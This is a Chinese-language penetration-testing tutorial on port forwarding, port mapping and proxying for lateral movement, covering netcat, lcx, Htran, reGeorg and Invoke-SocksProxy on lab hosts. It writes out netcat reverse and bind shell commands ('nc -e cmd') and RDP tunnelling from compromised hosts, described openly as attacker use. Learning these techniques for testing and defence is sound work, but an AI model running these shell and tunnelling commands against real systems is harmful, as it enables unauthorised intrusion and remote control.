# 端口转发&端口映射
## 0x01 什么是端口转发
端口转发（Port
forwarding），有时被叫做隧道，是安全壳（SSH）为网络安全通信使用的一种方法。端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，其使一个外部用户从外部经过一个被激活的NAT路由器到达一个在私有内部IP地址（局域网内部）上的一个端口。
普通话：端口转发就是将一个端口，这个端口可以本机的端口也可以是本机可以访问到的任意主机的端口，转发到任意一台可以访问到的IP上，通常这个IP是公网ip
## 0x02 什么是端口映射
端口映射是NAT的一种，功能是把在公网的地址转翻译成私有地址，  
采用路由方式的ADSL宽带路由器拥有一个动态或固定的公网IP，ADSL直接接在HUB或交换机上，所有的电脑共享上网。
普通话：就是映射端口，就是将一个内网端口映射到公网上的某个端口，假设我自己的电脑是在内网中，没有公网  
IP，但是我想提供一个端口供其他人使用，这就是端口映射
## 0x03 区分端口映射和端口转发
### 端口映射场景：
外网主机A想访问内网主机B上的服务
### 端口转发场景：
外网主机A已经可以任意内网主机B上的端口，但是无法访问内网主机C上的端口
此时可以将C主机的端口到B主机的端口，那么外网主机A访问B主机的某某端口就相当于访问了C主机的某某
### 总结：
>
> 端口转发和端口映射原理是一样的只不过是应用场景不一样，假如我们将本机的端口转发到远程主机端口，我们可以叫端口映射，也可以叫端口转发，看下图【注意图上文字】
> 我们如果把本机可以访问到的任意 IP  
>  的端口转发到另外一台服务器的端口，我们叫他端口转发，看下图【注意图上文字】
## 0x04 区分正向连接和反向连接
  * 正向连接：你的机器连接目标机器
  * 反向连接：目标机器反连你的机器
  * 不论映射，还是转发，都有正有反，原理相同
## 0x05 端口转发和代理工具
  * Lcx
  * Htran
  * Netcat
## 0x06 环境拓扑图
A 主机W7
B 主机W7
C 主机XP
## 0x07 NC
### NC 用法
### 2\. NC反向连接-网络环境设想：
> A外网 无法访问 内网B 【A为攻击者处于外网】
>
> B内网 可以访问 外网A
A：192.168.0.226
B：192.168.32.130
适合 **nc反向连接** ：也就将内网主机B shell反弹到 外网A
在外网主机A上执行：nc –nvlp 7777
在内网主机B上执行：nc –e cmd 192.168.0.226 7777
此处假装我连上了shell，并上传了nc
A主机处回显  
### 3\. NC正向连接-网络环境设想：
> A内网 可以访问 外网B 【A为攻击者处于内网】
>
> B外网 不能访问 内网A
适合 **nc正向连接** ：也就将内网主机A shell反弹到 外网B
在内网A 上执行 nc –l –p 5555 –e cmd .exe
在外网主机B上执行nc –nvv 192.168.0.226 5555
### 4\. 阐述：
如果客户端【相当于内网】连接服务器【相当于外网】，想获取服务器的shell，那么称为正向shell，如果是客户端连接服务器，服务器端想获取客户端的shell，那么称为反向shell
NC是安全的瑞士军刀，太出名了，不光能反弹shell,端口转发，还能聊天等等
## 0x08 LCX
### LCX用法：
### LCX端口映射环境设想：
> A外网 无法访问 内网B 【A为攻击者处于外网】
>
> B内网 可以访问 外网A
在内网主机B上执行：lcx.exe –slave 192.168.0.226 7777 192.168.32.132 3389
意思是：将内网 (192.168.32.132) 的 3389 端口转发到公网 (192.168.0.226) 的 7777  
端口
在外网主机A上执行：lcx.exe –listen 7777 5555
意思是：监听主机上7777 端口 并转给5555
此时，在主机A连接远程桌面访问127.0.0.1:5555 就相当于访问了B的3389  
### LCX端口转发环境设想：
> A外网 可以访问 B
>
> B内网 可以访问 C
>
> A不能访问 C
A主机ip：192.168.0.226
B 主机ip：192.168.32.130
C 主机ip：192.168.32.135
在内网主机B上执行：lcx.exe –tran 7777 192.168.32.135 3389
意思是：把C主机的3389端口转到B的7777端口上
此时访问B主机上的7777端口就相当于访问C主机上的3389
在A主机上运行mstsc连接192.168.32.130:7777或者B主机上127.0.0.1:7777就可以访问到C的3389
### 阐述
LCX多用于被空计算机（肉鸡）处于内网，黑客想使用远程终端进行管理的情况下，一般黑客会将肉鸡3389开启，之后通过LCX进行端口转发
## 0x09 HTRAN
### HTRAN用法
### HTRAN使用方法-环境设想一
B公网
A可直接访问B[并且B已经开启3389，B防火墙禁止3389连接]
B 也可以访问A
A主机ip：192.168.0.226
B 主机ip：192.168.32.130
C 主机ip：192.168.32.135
#### 方法1：
在B主机上执行：Htran2.4.exe -p -tran 7777 127.0.0.1 3389
意思是：将B的3389转为本机的7777端口
此时A主机进行远程桌面终端连接：192.168.32.130:7777
#### 方法2：
在A主机进行监听执行：HTran2.4.exe -p -listen 8888 9999
意思是：监听本机8888端口，并将8888端口流量转到9999
在B主机执行：HTran2.4.exe -p -slave 192.168.0.226 8888 127.0.0.1 3389
意思是：将本机的3389端口转发到A的8888端口
接下来在A主机上连接远程桌面访问本地的9999端口，即可连接到B的3389
### HTRAN使用方法-环境设想二
B主机在公网
C在B的内网
A可以访问B，不可以访问C
A主机ip：192.168.0.226
B 主机ip：192.168.32.130
C 主机ip：192.168.32.135
#### 方法1：
在B主机上执行：HTran2.4.exe -p -tran 8888 192.168.32.135 3389
意思是：将C主机的3389端口转发到B主机的8888
此时A连接B的8888就相当于访问C的3389
#### 方法2：
在B主机上进行监听HTran2.4.exe -p -listen 7777 9999
意思是：监听B主机的7777端口，并将流量转发到9999
在C主机上执行：HTran2.4.exe -p -slave 192.168.32.130 7777 127.0.0.1 3389
意思是：将C的3389转到B的7777端口
# 代理
## 0x01 什么是代理
代理（英语：Proxy），也称网络代理，是一种特殊的网络服务，允许一个网络终端（一般为客户端）通过这个服务与另一个网络终端（一般为服务器）进行非直接的连接。一些网关、路由器等网络设备具备网络代理功能。一般认为代理服务有利于保障网络终端的隐私或安全，防止攻击
## 0x02 代理类别
HTTP代理
SOCKS代理
FTP代理
Telnet代理
SSL代理
## 0x03 区分正向代理和反向代理
正向代理中，proxy 和 client 同属一个 LAN，对 server 透明； 反向代理中，proxy 和  
server 同属一个 LAN，对 client 透明，一个代理的是客户端，一个代理的是服务器
注：自己画的，不接受批评☺
## 0x04 reGeorg+Proxychains 代理
reGeorg是reDuh的继承者。主要是把内网服务器的端口通过http/https隧道转发到本机
选择对应服务器脚本上传到B主机的服务器，我这里面是php
访问文件显示Georg says, 'All seems fine',代理成功
然后执行reGeorgSocksProxy.py文件【需要urllib3模块】：python2  
reGeorgSocksProxy.py –u “ –p 8888
在命令行界面同样显示 All seems fine即可
接下来使用工具Proxifier
首先添加一个server
配置代理规则
这里选择选择远程桌面程序mstsc
连接远程桌面
可以看到通过代理走的流量
## 0x05 基于powershell的Socks4/5代理
使用的是Invoke-SocksProxy，地址：
### Invoke-SocksProxy用法
### Invoke-SocksProxy使用方法一
Win10主机ip:192.168.192.130
Win7 主机 ip:192.168.192.129
建立一个sock4/5代理
在Win10上首先以管理员权限运行powershell，如果提示脚本禁止执行，请输入“set-ExecutionPolicy  
RemoteSigned”即可
输入Import-Module .\Invoke-SocksProxy.psm1 导入模块